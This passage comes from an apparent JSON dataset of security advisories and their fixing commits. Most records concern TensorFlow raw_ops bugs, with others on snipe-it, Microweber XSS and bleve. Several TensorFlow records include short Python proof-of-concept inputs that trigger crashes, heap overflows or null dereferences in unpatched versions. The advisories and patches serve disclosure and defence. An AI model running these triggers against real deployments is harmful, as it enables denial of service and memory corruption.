us with issues and questions.","published_date":"2022-02-09","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0a365c029e437be0349c31f8d4c9926b69fa3fa1","commit_sha":"0a365c029e437be0349c31f8d4c9926b69fa3fa1","patch":"MULTI","chain_ord":"['0a365c029e437be0349c31f8d4c9926b69fa3fa1', '045deec1cbdebb27d817008ad5df94d96a08b1bf']","before_first_fix_commit":"{'0a365c029e437be0349c31f8d4c9926b69fa3fa1'}","last_fix_commit":"045deec1cbdebb27d817008ad5df94d96a08b1bf","chain_ord_pos":1.0,"commit_datetime":"11\/13\/2021, 18:05:59","message":"Prevent null pointer dereference in constant folding.\n\nUnder certain conditions, an invalid protobuf saved model with invalid nodes would be loaded. During optimization phase, Grappler optimizer will then dereference a null pointer.\n\nPiperOrigin-RevId: 409683530\nChange-Id: I1f10340a7ec384bc9bc587300390f1078cf5caa0","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/grappler\/optimizers\/constant_folding.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/0a365c029e437be0349c31f8d4c9926b69fa3fa1\/tensorflow%2Fcore%2Fgrappler%2Foptimizers%2Fconstant_folding.cc', 'patch': '@@ -3505,6 +3505,9 @@ bool ConstantFolding::MulConvPushDown(GraphDef* optimized_graph, NodeDef* node,\\n \\n   NodeDef* mul_left_child = node_map_->GetNode(node->input(0));\\n   NodeDef* mul_right_child = node_map_->GetNode(node->input(1));\\n+  if (mul_left_child == nullptr || mul_right_child == nullptr) {\\n+    return false;\\n+  }\\n   \/\/ One child must be constant, and the second must be Conv op.\\n   const bool left_child_is_constant = IsReallyConstant(*mul_left_child);\\n   const bool right_child_is_constant = IsReallyConstant(*mul_right_child);'}}","message_norm":"prevent null pointer dereference in constant folding.\n\nunder certain conditions, an invalid protobuf saved model with invalid nodes would be loaded. during optimization phase, grappler optimizer will then dereference a null pointer.\n\npiperorigin-revid: 409683530\nchange-id: i1f10340a7ec384bc9bc587300390f1078cf5caa0","language":"en","entities":"[('prevent', 'ACTION', ''), ('null pointer dereference', 'SECWORD', ''), ('409683530', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/grappler\/optimizers\/constant_folding.cc'])","num_files":1.0},{"index":1429,"vuln_id":"GHSA-9rpc-5v9q-5r7f","cwe_id":"{'CWE-665', 'CWE-20'}","score":3.6,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6'}","dataset":"osv","summary":"Incomplete validation in `SparseReshape` ### Impact\nIncomplete validation in `SparseReshape` results in a denial of service based on a `CHECK`-failure.\n\n```python\nimport tensorflow as tf\n\ninput_indices = tf.constant(41, shape=[1, 1], dtype=tf.int64)\ninput_shape = tf.zeros([11], dtype=tf.int64)\nnew_shape = tf.zeros([1], dtype=tf.int64)\n\ntf.raw_ops.SparseReshape(input_indices=input_indices,\n    input_shape=input_shape,\n    new_shape=new_shape)\n``` \n    \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/e87b51ce05c3eb172065a6ea5f48415854223285\/tensorflow\/core\/kernels\/sparse_reshape_op.cc#L40) has no validation that the input arguments specify a valid sparse tensor.\n\n### Patches \nWe have patched the issue in GitHub commit [1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2 and TensorFlow 2.3.3, as these are the only affected versions.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6","commit_sha":"1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6","patch":"SINGLE","chain_ord":"['1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6']","before_first_fix_commit":"{'8d78df9997a8537a2f389adc2cfdc36e71da0665'}","last_fix_commit":"1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6","chain_ord_pos":1.0,"commit_datetime":"04\/29\/2021, 22:30:30","message":"Fix heap-buffer-overflow issue with `tf.raw_ops.SparseReshape`.\n\nPiperOrigin-RevId: 371218558\nChange-Id: I6a6dc5bf15b50a1d05bdd95e9ba347cb39f40f45","author":"Amit Patankar","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'tensorflow\/core\/kernels\/sparse_reshape_op.cc': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6\/tensorflow%2Fcore%2Fkernels%2Fsparse_reshape_op.cc', 'patch': '@@ -26,6 +26,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/framework\/types.h\"\\n #include \"tensorflow\/core\/kernels\/reshape_util.h\"\\n #include \"tensorflow\/core\/lib\/gtl\/inlined_vector.h\"\\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n \\n namespace tensorflow {\\n \\n@@ -38,6 +39,17 @@ class SparseReshapeOp : public OpKernel {\\n   explicit SparseReshapeOp(OpKernelConstruction* context) : OpKernel(context) {}\\n \\n   void Compute(OpKernelContext* context) override {\\n+    const Tensor& input_indices_in = context->input(0);\\n+    const Tensor& input_shape_in = context->input(1);\\n+\\n+    OP_REQUIRES(context, TensorShapeUtils::IsMatrix(input_indices_in.shape()),\\n+                errors::InvalidArgument(\"Input must be a matrix.\"));\\n+    OP_REQUIRES(context, TensorShapeUtils::IsVector(input_shape_in.shape()),\\n+                errors::InvalidArgument(\"Input shape must be a vector.\"));\\n+    OP_REQUIRES(context,\\n+                input_indices_in.dim_size(1) == input_shape_in.dim_size(0),\\n+                errors::InvalidArgument(\\n+                    \"Input tensor rank must match input shape length.\"));\\n     ReshapeSparseTensor<Device>(context, context->input(0), context->input(1),\\n                                 context->input(2), 0 \/* output indices index *\/,\\n                                 1 \/* output shape index *\/);'}}","message_norm":"fix heap-buffer-overflow issue with `tf.raw_ops.sparsereshape`.\n\npiperorigin-revid: 371218558\nchange-id: i6a6dc5bf15b50a1d05bdd95e9ba347cb39f40f45","language":"en","entities":"[('fix', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('issue', 'FLAW', ''), ('371218558', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_reshape_op.cc'])","num_files":1.0},{"index":1436,"vuln_id":"GHSA-9vpm-rcf4-9wqw","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/376c352a37ce5a68b721406dc7e77ac4b6cf483d'}","dataset":"osv","summary":"Division by 0 in `MaxPoolGradWithArgmax` ### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` is vulnerable to a division by 0:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nargmax = tf.constant([], shape=[0], dtype=tf.int64)\nksize = [1, 1, 1, 1]\nstrides = [1, 1, 1, 1]\n\ntf.raw_ops.MaxPoolGradWithArgmax(\n  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,\n  padding='SAME', include_batch_in_index=False)\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/279bab6efa22752a2827621b7edb56a730233bd8\/tensorflow\/core\/kernels\/maxpooling_op.cc#L1033-L1034) fails to validate that the batch dimension of the tensor is non-zero, before dividing by this quantity.\n\n### Patches\nWe have patched the issue in GitHub commit [376c352a37ce5a68b721406dc7e77ac4b6cf483d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/376c352a37ce5a68b721406dc7e77ac4b6cf483d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/376c352a37ce5a68b721406dc7e77ac4b6cf483d","commit_sha":"376c352a37ce5a68b721406dc7e77ac4b6cf483d","patch":"SINGLE","chain_ord":"['376c352a37ce5a68b721406dc7e77ac4b6cf483d']","before_first_fix_commit":"{'279bab6efa22752a2827621b7edb56a730233bd8'}","last_fix_commit":"376c352a37ce5a68b721406dc7e77ac4b6cf483d","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 21:34:54","message":"Don't do any work if output tensor is null (prevent div by 0)\n\nPiperOrigin-RevId: 372208700\nChange-Id: Iea6b6293e887ade8538facfdb50fb931e17f511e","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/maxpooling_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/376c352a37ce5a68b721406dc7e77ac4b6cf483d\/tensorflow%2Fcore%2Fkernels%2Fmaxpooling_op.cc', 'patch': '@@ -1088,6 +1088,8 @@ class MaxPoolingGradWithArgmaxOp : public OpKernel {\\n     OP_REQUIRES_OK(context, context->forward_input_or_allocate_output(\\n                                 {0}, 0, out_shape, &grad_out));\\n \\n+    if (out_shape.num_elements() == 0) return;  \/\/ nothing to be done\\n+\\n     LaunchMaxPoolingGradWithArgmax<Device, T>::launch(\\n         context, params, grad_in, argmax, grad_out, include_batch_in_index_);\\n   }'}}","message_norm":"don't do any work if output tensor is null (prevent div by 0)\n\npiperorigin-revid: 372208700\nchange-id: iea6b6293e887ade8538facfdb50fb931e17f511e","language":"en","entities":"[('prevent', 'ACTION', ''), ('div by 0', 'SECWORD', ''), ('372208700', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/maxpooling_op.cc'])","num_files":1.0},{"index":1437,"vuln_id":"GHSA-9vwf-54m9-gc4f","cwe_id":"{'CWE-862', 'CWE-284'}","score":4.3,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/1699c09758e56f740437674a8d6ba36443399f24'}","dataset":"osv","summary":"snipe-it is vulnerable to Improper Access Control snipe-it prior to version 5.3.4 is vulnerable to Improper Access Control. Regular users with `DENY` set to all models permissions can still view model information via the \/models\/{id}\/clone endpoint due to no authorize('view') permission being set.","published_date":"2021-12-16","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/1699c09758e56f740437674a8d6ba36443399f24","commit_sha":"1699c09758e56f740437674a8d6ba36443399f24","patch":"SINGLE","chain_ord":"['1699c09758e56f740437674a8d6ba36443399f24']","before_first_fix_commit":"{'918e7c8dae4d41935f534901a582ea8488bbf603'}","last_fix_commit":"1699c09758e56f740437674a8d6ba36443399f24","chain_ord_pos":1.0,"commit_datetime":"12\/09\/2021, 13:42:18","message":"Update AssetModelsController.php","author":"Haxatron","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'app\/Http\/Controllers\/AssetModelsController.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/1699c09758e56f740437674a8d6ba36443399f24\/app%2FHttp%2FControllers%2FAssetModelsController.php', 'patch': \"@@ -269,7 +269,7 @@ public function show($modelId = null)\\n     *\/\\n     public function getClone($modelId = null)\\n     {\\n-        $this->authorize('view', AssetModel::class);\\n+        $this->authorize('create', AssetModel::class);\\n         \/\/ Check if the model exists\\n         if (is_null($model_to_clone = AssetModel::find($modelId))) {\\n             return redirect()->route('models.index')->with('error', trans('admin\/models\/message.does_not_exist'));\"}}","message_norm":"update assetmodelscontroller.php","language":"it","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Controllers\/AssetModelsController.php'])","num_files":1.0},{"index":1439,"vuln_id":"GHSA-9w2p-5mgw-p94c","cwe_id":"{'CWE-681'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/96f364a1ca3009f98980021c4b32be5fdcca33a1'}","dataset":"osv","summary":"Integer overflow due to conversion to unsigned ### Impact\nThe implementation of `tf.raw_ops.QuantizeAndDequantizeV4Grad` is vulnerable to an integer overflow issue caused by converting a signed integer value to an unsigned one and then allocating memory based on this value.\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeAndDequantizeV4Grad(\n  gradients=[1.0,2.0],\n  input=[1.0,1.0],\n  input_min=[0.0],\n  input_max=[10.0],\n  axis=-100)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc#L126) uses the `axis` value as the size argument to `absl::InlinedVector` constructor. But, the constructor uses an unsigned type for the argument, so the implicit conversion transforms the negative value to a large integer.\n\n### Patches\nWe have patched the issue in GitHub commit [96f364a1ca3009f98980021c4b32be5fdcca33a1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/96f364a1ca3009f98980021c4b32be5fdcca33a1).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, and TensorFlow 2.4.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/96f364a1ca3009f98980021c4b32be5fdcca33a1","commit_sha":"96f364a1ca3009f98980021c4b32be5fdcca33a1","patch":"SINGLE","chain_ord":"['96f364a1ca3009f98980021c4b32be5fdcca33a1']","before_first_fix_commit":"{'10fe168385e67aca66427910ba6942eb14d31c5a'}","last_fix_commit":"96f364a1ca3009f98980021c4b32be5fdcca33a1","chain_ord_pos":1.0,"commit_datetime":"08\/02\/2021, 20:27:01","message":"Validate axis input in tf.raw_ops.QuantizeAndDequantizeV4Grad\n\nPiperOrigin-RevId: 388291385\nChange-Id: I3bab68dc61d935afa96c0da021a7b722c6dc8dc8","author":"Laura Pak","comments":null,"stats":"{'additions': 7, 'deletions': 0, 'total': 7}","files":"{'tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc': {'additions': 7, 'deletions': 0, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/96f364a1ca3009f98980021c4b32be5fdcca33a1\/tensorflow%2Fcore%2Fkernels%2Fquantize_and_dequantize_op.cc', 'patch': '@@ -158,6 +158,13 @@ class QuantizeAndDequantizeV4GradientOp : public OpKernel {\\n     Tensor* input_backprop = nullptr;\\n     OP_REQUIRES_OK(ctx,\\n                    ctx->allocate_output(0, input.shape(), &input_backprop));\\n+    OP_REQUIRES(\\n+        ctx, axis_ >= -1,\\n+        errors::InvalidArgument(\"Axis must be at least -1. Found \", axis_));\\n+    OP_REQUIRES(ctx, (axis_ == -1 || axis_ < input.shape().dims()),\\n+                errors::InvalidArgument(\\n+                    \"Axis should be -1 or 0 or a positive value less than \",\\n+                    input.shape().dims(), \"but given axis value was \", axis_));\\n \\n     OP_REQUIRES(\\n         ctx, input.IsSameSize(gradient),'}}","message_norm":"validate axis input in tf.raw_ops.quantizeanddequantizev4grad\n\npiperorigin-revid: 388291385\nchange-id: i3bab68dc61d935afa96c0da021a7b722c6dc8dc8","language":"ca","entities":"[('validate', 'ACTION', ''), ('388291385', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc'])","num_files":1.0},{"index":1441,"vuln_id":"GHSA-9w7h-3wwh-6m5q","cwe_id":"{'CWE-79'}","score":6.3,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/ad3928f67b2cd4443f4323d858b666d35a919ba8'}","dataset":"osv","summary":"Cross-site Scripting in Microweber Microweber prior to 1.2.15 is vulnerable to reflected cross-site scripting on demo.microweber.org\/demo\/module\/. This allows the execution of arbitrary JavaScript as the attacked user.","published_date":"2022-04-23","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/ad3928f67b2cd4443f4323d858b666d35a919ba8","commit_sha":"ad3928f67b2cd4443f4323d858b666d35a919ba8","patch":"SINGLE","chain_ord":"['ad3928f67b2cd4443f4323d858b666d35a919ba8']","before_first_fix_commit":"{'3e47c4f1933aa3ffd0975e24e34b7af35de947b4'}","last_fix_commit":"ad3928f67b2cd4443f4323d858b666d35a919ba8","chain_ord_pos":1.0,"commit_datetime":"04\/22\/2022, 16:26:41","message":"update","author":"Peter Ivanov","comments":null,"stats":"{'additions': 7, 'deletions': 2, 'total': 9}","files":"{'src\/MicroweberPackages\/App\/Http\/Controllers\/ApiController.php': {'additions': 7, 'deletions': 2, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/ad3928f67b2cd4443f4323d858b666d35a919ba8\/src%2FMicroweberPackages%2FApp%2FHttp%2FControllers%2FApiController.php', 'patch': \"@@ -611,18 +611,23 @@ public function module()\\n             $request_data_new = [];\\n             $antixss = new AntiXSS();\\n             foreach ($request_data as $k=>$v){\\n-\\n+                if(is_string($v)) {\\n+                    $v = str_replace('<', '-', $v);\\n+                    $v = str_replace('>', '-', $v);\\n+                }\\n                 $v = $antixss->xss_clean($v);\\n \\n                 if(is_string($k)){\\n+                    $k = str_replace('<', '-', $k);\\n+                    $k = str_replace('>', '-', $k);\\n                     $k = $antixss->xss_clean($k);\\n                     if($k){\\n                         $request_data_new[$k] = $v;\\n                     }\\n                 } else {\\n                     $request_data_new[$k] = $v;\\n                 }\\n-                \\n+\\n             }\\n             $request_data = $request_data_new;\\n         }\"}}","message_norm":"update","language":"ro","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/App\/Http\/Controllers\/ApiController.php'])","num_files":1.0},{"index":1443,"vuln_id":"GHSA-9w9f-6mg8-jp7w","cwe_id":"{'CWE-306'}","score":5.5,"chain":"{'https:\/\/github.com\/blevesearch\/bleve\/commit\/1c7509d6a17d36f265c90b4e8f4e3a3182fe79ff'}","dataset":"osv","summary":"Missing Role Based Access Control for the REST handlers in bleve\/http package ### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nBleve includes HTTP utilities under bleve\/http package, that are used by its sample application. \n(https:\/\/github.com\/blevesearch\/bleve-explorer)\nThese HTTP methods paves way for exploitation of a node\u2019s filesystem where the bleve index resides, \nif the user has used bleve\u2019s own HTTP (bleve\/http) handlers for exposing the access to the indexes. \nFor instance, the CreateIndexHandler (http\/index_create.go) and DeleteIndexHandler (http\/index_delete.go) \nenable an attacker to create a bleve index (directory structure) anywhere where the user running the server \nhas the write permissions and to delete recursively any directory owned by the same user account.\n \nUsers who have used the bleve\/http package for exposing access to bleve index without the explicit \nhandling for the Role Based Access Controls(RBAC) of the index assets would be impacted.\n\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\n**No**. The http package is purely intended to be used for demonstration purposes. \nAnd bleve is never designed to be handling the RBACs or it was ever advertised to be used in that way. \nHence the collaborators of this project have decided to stay away from adding any authentication or \nauthorization to bleve project at the moment.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nThe bleve\/http package is mainly for demonstration purposes and it lacks exhaustive validation of the user \ninputs as well as any authentication and authorization measures. \nSo it is recommended to not use that in production use cases.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue [here](https:\/\/github.com\/blevesearch\/bleve\/issues).\n* Email us at [mailto:security@couchbase.com, fts-team@couchbase.com].","published_date":"2022-06-03","chain_len":1,"project":"https:\/\/github.com\/blevesearch\/bleve","commit_href":"https:\/\/github.com\/blevesearch\/bleve\/commit\/1c7509d6a17d36f265c90b4e8f4e3a3182fe79ff","commit_sha":"1c7509d6a17d36f265c90b4e8f4e3a3182fe79ff","patch":"SINGLE","chain_ord":"['1c7509d6a17d36f265c90b4e8f4e3a3182fe79ff']","before_first_fix_commit":"{'3b8127049e42df67c204bfac1d0b037b952e9a55'}","last_fix_commit":"1c7509d6a17d36f265c90b4e8f4e3a3182fe79ff","chain_ord_pos":1.0,"commit_datetime":"06\/01\/2022, 15:49:02","message":"Link security advisory to README (#1694)","author":"Abhinav Dangeti","comments":null,"stats":"{'additions': 6, 'deletions': 4, 'total': 10}","files":"{'http\/README.md': {'additions': 6, 'deletions': 4, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/blevesearch\/bleve\/raw\/1c7509d6a17d36f265c90b4e8f4e3a3182fe79ff\/http%2FREADME.md', 'patch': '@@ -3,8 +3,10 @@\\n This http package is purely for the demonstration purposes and is used by sample\\n applications like https:\/\/github.com\/blevesearch\/bleve-explorer.\\n \\n-Please be aware that the http handler implementations neither provide exhaustive \\n-user input validations nor authentication or authorization of the user access. \\n+Please be aware that the http handler implementations neither provide exhaustive\\n+user input validations nor authentication or authorization of the user access.\\n \\n-So, it is recommended to remain cautious against the use of the http package in \\n-production use cases.\\n\\\\ No newline at end of file\\n+So, it is strongly recommended that users exercise caution while using the http\\n+package in production situations.\\n+\\n+[Here](https:\/\/github.com\/blevesearch\/bleve\/security\/advisories\/GHSA-9w9f-6mg8-jp7w) is the security advisory on this.'}}","message_norm":"link security advisory to readme (#1694)","language":"en","entities":"[('security', 'SECWORD', ''), ('#1694', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['http\/README.md'])","num_files":1.0},{"index":1450,"vuln_id":"GHSA-9xh4-23q4-v6wr","cwe_id":"{'CWE-476', 'CWE-787', 'CWE-125'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6972f9dfe325636b3db4e0bc517ee22a159365c0'}","dataset":"osv","summary":"Heap buffer overflow and undefined behavior in `FusedBatchNorm` ### Impact\nThe implementation of `tf.raw_ops.FusedBatchNorm` is vulnerable to a heap buffer overflow:\n      \n```python\nimport tensorflow as tf\n\nx = tf.zeros([10, 10, 10, 6], dtype=tf.float32)\nscale = tf.constant([0.0], shape=[1], dtype=tf.float32)\noffset = tf.constant([0.0], shape=[1], dtype=tf.float32)\nmean = tf.constant([0.0], shape=[1], dtype=tf.float32)\nvariance = tf.constant([0.0], shape=[1], dtype=tf.float32)\nepsilon = 0.0\nexponential_avg_factor = 0.0\ndata_format = \"NHWC\"\nis_training = False\n    \ntf.raw_ops.FusedBatchNorm(\n  x=x, scale=scale, offset=offset, mean=mean, variance=variance,\n  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,\n  data_format=data_format, is_training=is_training)\n```\n  \nIf the tensors are empty, the same implementation can trigger undefined behavior by dereferencing null pointers:\n\n```python \nimport tensorflow as tf\nimport numpy as np\n\nx = tf.zeros([10, 10, 10, 1], dtype=tf.float32)\nscale = tf.constant([], shape=[0], dtype=tf.float32)\noffset = tf.constant([], shape=[0], dtype=tf.float32)\nmean = tf.constant([], shape=[0], dtype=tf.float32)\nvariance = tf.constant([], shape=[0], dtype=tf.float32)\nepsilon = 0.0\nexponential_avg_factor = 0.0\ndata_format = \"NHWC\"\nis_training = False\n\ntf.raw_ops.FusedBatchNorm(\n  x=x, scale=scale, offset=offset, mean=mean, variance=variance, \n  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,\n  data_format=data_format, is_training=is_training)\n``` \n\nThe  [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/57d86e0db5d1365f19adcce848dfc1bf89fdd4c7\/tensorflow\/core\/kernels\/fused_batch_norm_op.cc) fails to validate that `scale`, `offset`, `mean` and `variance` (the last two only when required) all have the same number of elements as the number of channels of `x`. This results in heap out of bounds reads when the buffers backing these tensors are indexed past their boundary.\n\nIf the tensors are empty, the validation mentioned in the above paragraph would also trigger and prevent the undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [6972f9dfe325636b3db4e0bc517ee22a159365c0](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6972f9dfe325636b3db4e0bc517ee22a159365c0).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6972f9dfe325636b3db4e0bc517ee22a159365c0","commit_sha":"6972f9dfe325636b3db4e0bc517ee22a159365c0","patch":"SINGLE","chain_ord":"['6972f9dfe325636b3db4e0bc517ee22a159365c0']","before_first_fix_commit":"{'57d86e0db5d1365f19adcce848dfc1bf89fdd4c7'}","last_fix_commit":"6972f9dfe325636b3db4e0bc517ee22a159365c0","chain_ord_pos":1.0,"commit_datetime":"05\/07\/2021, 00:45:51","message":"Add missing valuidation to FusedBatchNorm.\n\nPiperOrigin-RevId: 372460336\nChange-Id: Ic8c4e4de67c58a741bd87f2e182bed07247d1126","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 27, 'deletions': 1, 'total': 28}","files":"{'tensorflow\/core\/kernels\/fused_batch_norm_op.cc': {'additions': 27, 'deletions': 1, 'changes': 28, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/6972f9dfe325636b3db4e0bc517ee22a159365c0\/tensorflow%2Fcore%2Fkernels%2Ffused_batch_norm_op.cc', 'patch': '@@ -1282,6 +1282,32 @@ class FusedBatchNormOpBase : public OpKernel {\\n                   errors::InvalidArgument(\"Error during tensor copy.\"));\\n     }\\n \\n+    const auto num_channels = GetTensorDim(x, tensor_format_, \\'C\\');\\n+    OP_REQUIRES(\\n+        context, scale.NumElements() == num_channels,\\n+        errors::InvalidArgument(\"scale must have the same number of elements \"\\n+                                \"as the channels of x, got \",\\n+                                scale.NumElements(), \" and \", num_channels));\\n+    OP_REQUIRES(\\n+        context, offset.NumElements() == num_channels,\\n+        errors::InvalidArgument(\"offset must have the same number of elements \"\\n+                                \"as the channels of x, got \",\\n+                                offset.NumElements(), \" and \", num_channels));\\n+    if (estimated_mean.NumElements() != 0) {\\n+      OP_REQUIRES(context, estimated_mean.NumElements() == num_channels,\\n+                  errors::InvalidArgument(\\n+                      \"mean must be empty or have the same number of \"\\n+                      \"elements as the channels of x, got \",\\n+                      estimated_mean.NumElements(), \" and \", num_channels));\\n+    }\\n+    if (estimated_variance.NumElements() != 0) {\\n+      OP_REQUIRES(context, estimated_variance.NumElements() == num_channels,\\n+                  errors::InvalidArgument(\\n+                      \"variance must be empty or have the same number of \"\\n+                      \"elements as the channels of x, got \",\\n+                      estimated_variance.NumElements(), \" and \", num_channels));\\n+    }\\n+\\n     if (has_side_input_) {\\n       OP_REQUIRES(context, side_input->shape() == x.shape(),\\n                   errors::InvalidArgument(\\n@@ -1294,7 +1320,7 @@ class FusedBatchNormOpBase : public OpKernel {\\n       \/\/ NOTE(ezhulenev): This requirement is coming from implementation\\n       \/\/ details of cudnnBatchNormalizationForwardTrainingEx.\\n       OP_REQUIRES(\\n-          context, !is_training_ || x.dim_size(3) % 4 == 0,\\n+          context, !is_training_ || num_channels % 4 == 0,\\n           errors::InvalidArgument(\"FusedBatchNorm with activation requires \"\\n                                   \"channel dimension to be a multiple of 4.\"));\\n     }'}}","message_norm":"add missing valuidation to fusedbatchnorm.\n\npiperorigin-revid: 372460336\nchange-id: ic8c4e4de67c58a741bd87f2e182bed07247d1126","language":"en","entities":"[('add', 'ACTION', ''), ('372460336', 'SHA', 